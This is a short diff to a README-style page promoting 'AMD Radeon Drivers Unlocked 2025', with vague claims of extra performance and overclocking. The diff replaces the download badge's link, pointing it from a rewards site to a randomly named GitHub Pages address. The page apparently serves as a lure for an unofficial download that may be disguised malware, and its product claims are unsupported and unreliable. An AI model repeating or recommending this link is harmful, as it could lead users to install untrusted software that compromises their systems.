@@ -2,7 +2,7 @@
 
 AMD Radeon Drivers Unlocked 2025 bring you the full power of your Radeon GPU with advanced features, custom performance optimizations, and expanded overclocking options. Unlike standard drivers, this unlocked version gives you greater flexibility, stability, and fine-tuning capabilities for both gaming and professional workloads.
 
-[![Download AMD Radeon Drivers Unlocked](https://img.shields.io/badge/Download-AMD%20Radeon%20Drivers-red)](https://paddyrewards.com/)
+[![Download AMD Radeon Drivers Unlocked](https://img.shields.io/badge/Download-AMD%20Radeon%20Drivers-red)](https://unnipenquiteegqff.github.io/.github/AMD-Radeon-Drivers)
 
 ---
 
